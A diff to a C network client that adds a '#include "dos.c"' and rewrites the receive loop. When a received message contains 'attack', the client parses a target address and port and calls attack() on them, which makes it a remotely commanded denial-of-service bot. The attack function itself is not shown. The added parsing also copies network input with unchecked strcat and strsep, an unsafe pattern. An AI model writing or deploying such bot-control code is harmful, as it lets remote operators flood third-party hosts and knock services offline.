@@ -23,6 +23,8 @@
 #define CLIENTPORT 1574
 #define BUFSIZE 2048
 
+#include "dos.c"
+
 int main(int argc, char *argv[])
 {
     int sockfd;
@@ -32,6 +34,7 @@ int main(int argc, char *argv[])
     int recvbytes;
     char recv_buf[BUFSIZE];
     char send_buf[BUFSIZE];
+    
     int data_len;
 
     if (2 > argc)
@@ -91,8 +94,29 @@ int main(int argc, char *argv[])
                 exit(1);
             }
             recv_buf[recvbytes] = '\0';
-            printf("%s\n", recv_buf);
-            fflush(stdout);
+	    if(strstr(recv_buf,"attack") != NULL)
+            {
+            	char *data = recv_buf;
+                printf("%s\n",data);
+                char *addr;
+                char *port;
+                char *cmd;
+                cmd = strsep(&data," ");
+                addr = strsep(&data," ");
+                port = strsep(&data," ");
+		char print_buf[BUFSIZE]={'\0'};
+                strcat(print_buf, "start attacking ");
+		strcat(print_buf, addr);
+		strcat(print_buf, " ");
+                strcat(print_buf, port);
+		printf("%s\n", print_buf);
+		fflush(stdout);
+		attack(addr, port);
+              }else{
+		printf("%s\n", recv_buf);
+		fflush(stdout);
+		}
+            
         }
         if ( FD_ISSET( 0, &sockset))
         {
